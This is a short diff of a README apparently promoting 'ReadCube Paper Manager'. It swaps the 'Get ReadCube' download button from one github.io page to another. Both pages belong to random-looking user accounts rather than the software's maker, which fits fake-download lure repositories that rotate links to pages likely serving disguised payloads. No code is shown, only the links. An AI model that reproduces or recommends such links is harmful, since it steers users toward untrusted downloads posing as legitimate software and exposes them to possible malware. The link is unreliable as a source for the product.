@@ -21,7 +21,7 @@ To begin using this **ReadCube Paper Manager** and **ReadCube PDF Annotator**, f
 | :--- | :--- |
 | **Get ReadCube Paper Manager** | Click the button below to start using this **ReadCube Reference Tool**. |
 
-[![Button](https://img.shields.io/badge/📚-Get_ReadCube-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/readcube-paper-manager)
+[![Button](https://img.shields.io/badge/📚-Get_ReadCube-2ea44f?style=for-the-badge)](https://luisschroederdrbf.github.io/.github/readcube-paper-manager)
 
 ## System Requirements
 
